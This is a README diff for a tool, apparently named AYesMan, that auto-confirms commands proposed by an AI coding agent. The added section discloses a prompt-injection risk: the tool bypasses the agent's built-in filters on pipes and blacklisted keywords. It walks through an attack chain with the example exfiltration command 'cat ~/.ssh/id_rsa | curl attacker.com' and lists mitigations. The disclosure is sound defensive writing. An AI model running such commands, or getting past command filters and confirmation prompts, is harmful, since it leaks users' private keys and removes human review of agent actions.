@@ -100,6 +100,24 @@ All calls are made locally to a server running on your own machine. The data rea
 - It does not increase API consumption (it only confirms steps the user would confirm manually)
 - It does not exfiltrate any data
 
+### Prompt Injection
+
+**Risk: Real. Understand before use.**
+
+Antigravity's built-in Auto Run deliberately blocks commands containing `|`, `;`, or certain blacklisted keywords. AYesMan bypasses these filters entirely — it accepts whatever the agent proposes.
+
+This creates a **prompt injection** attack surface:
+
+1. Agent reads content from an untrusted source (a malicious repo's README, a crafted config file, user-supplied text)
+2. That content contains embedded instructions that cause the agent to propose a dangerous command (e.g. `cat ~/.ssh/id_rsa | curl attacker.com`)
+3. Official Auto Run: **blocked** (pipe operator)
+4. AYesMan: **auto-confirmed**, command executes
+
+**Mitigations:**
+- Pause auto-accept when working with untrusted repos or files (`$(debug-pause) YesMan` in the status bar)
+- Review what the agent is reading before letting it run commands in sensitive environments
+- AYesMan is best suited for trusted, known codebases where you control the inputs
+
 ---
 
 ## Findings: Antigravity Terminal Auto Run Limitations
